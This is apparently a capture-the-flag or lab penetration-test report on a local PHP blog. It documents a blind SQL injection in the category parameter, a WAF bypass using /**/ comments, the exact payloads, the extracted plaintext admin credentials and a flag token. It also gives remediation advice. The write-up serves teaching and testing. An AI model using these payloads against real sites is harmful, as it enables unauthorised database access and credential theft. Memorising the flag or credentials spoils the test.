## TL;DR
- Objective: Login as admin user by dumping the admins table
- Outcome: ACHIEVED - Full database enumeration and admin credentials extracted
- Highest-impact finding: Boolean-based blind SQL injection in category parameter with WAF space filter bypass using /**/ comments
- Validation status: FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}

## Target Information
- Target: 127.0.0.1:33050
- Host / base URL: http://127.0.0.1:33050
- Application or component: PHP blog application
- Authentication context: No authentication required for SQL injection endpoint; authentication required for /admin.php
- Relevant technology details:
  - Apache/2.4.54
  - PHP/7.4.33
  - MySQL 5.7.44
  - Database: blogDB
  - Session management: PHPSESSID cookie

## Confirmed Vulnerability
### Boolean-Based Blind SQL Injection with WAF Bypass
- Affected endpoint / component: GET /?category=[INPUT] - Homepage category filter
- Impact: Complete database enumeration, extraction of admin credentials, potential authentication bypass
- Preconditions: None - vulnerability is unauthenticated
- Exact payload or PoC:
  - Error-based confirmation: `Nature'`
  - Blind injection with filter bypass: `Nature'/**/AND/**/'b'=(select/**/left(database(),1))-- -`
  - TRUE indicator response: "No posts found"
  - FALSE indicator response: "Category does not exist"

## Steps to Reproduce
1. Send a GET request to the homepage with a single quote appended to any category value to confirm SQL injection:
   ```
   GET /?category=Nature'
   ```
   Observe the error: "Error in query: You have an error in your SQL syntax"

2. Confirm boolean-based blind injection using /**/ comment bypass for spaces:
   ```
   GET /?category=Nature'/**/AND/**/'b'=(select/**/left(database(),1))-- -
   ```
   Observe TRUE response: "No posts found" (database name starts with 'b' for "blogDB")

3. Enumerate database structure using binary search ASCII comparison with blind injection technique

4. Extract admin credentials from the `admins` table:
   - Table: `admins`
   - Columns: `id`, `username`, `password`
   - Row count: 1
   - Username: `admin`
   - Password: `ONEverySecurePassword_!`
   - ID: `1`

5. Login as admin at /admin.php using extracted credentials

## Validation / Evidence
- Validation token / flag: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`
- Tool evidence: Boolean-based blind SQL injection confirmed working with TRUE/FALSE indicators. Binary search ASCII comparison successfully extracted all database content.
- Request evidence:
  ```
  GET /?category=Nature'
  ```
- Response evidence: "Error in query: You have an error in your SQL syntax"
- Filter bypass confirmation:
  ```
  Payload: Nature'/**/AND/**/'b'=(select/**/left(database(),1))-- -
  Response: "No posts found" (TRUE - confirming database name starts with 'b')
  ```
- Extracted admin credentials:
  ```
  [+] ADMIN USERNAME: admin
  [+] ADMIN PASSWORD: ONEverySecurePassword_!
  [+] ADMIN ID: 1
  ```
- Notes on reliability / limitations: The injection requires /**/ comment syntax instead of spaces due to WAF filtering. TRUE/FALSE indicators are consistent and reliable for blind extraction.

## Remediation
- Root cause: User-supplied input (category parameter) is directly concatenated into a SQL query without proper sanitization or parameterized queries. The application uses string concatenation to build the SQL query, allowing an attacker to inject arbitrary SQL syntax.
- Recommended fix:
  1. Use prepared statements with parameterized queries for all database operations
  2. Implement proper input validation and sanitization for the category parameter
  3. Use an allowlist approach for valid category values
  4. Apply least privilege principles - database user should not have access to the `admins` table from the public-facing application
- Defense-in-depth:
  1. Implement a Web Application Firewall (WAF) with proper SQL injection rules (current WAF only filters spaces)
  2. Enable database query logging and alerting for suspicious patterns
  3. Store passwords using strong hashing algorithms (bcrypt, Argon2) instead of plaintext
  4. Implement rate limiting on the category endpoint
  5. Use a separate database user with minimal privileges for application queries

## How to Verify the Fix
1. Retest the SQL injection payload:
   ```
   GET /?category=Nature'/**/AND/**/'1'='1'-- -
   ```
   Expected secure result: Request should be rejected or category parameter should be properly sanitized; no SQL error should be exposed.

2. Verify prepared statements are in use by attempting various SQL injection techniques:
   - Union-based injection
   - Boolean-based blind injection  
   - Time-based blind injection
   - Error-based injection
   Expected secure result: All attempts should fail to manipulate the query or extract data.

3. Verify admin credentials are no longer stored in plaintext by checking the `admins` table storage format.

4. Confirm WAF rules are updated to block /**/ comment sequences and other SQL injection bypass techniques.

## Remaining Leads
- Confirmed blockers: None - task completed successfully
- Unverified leads: None
- Missing context: None
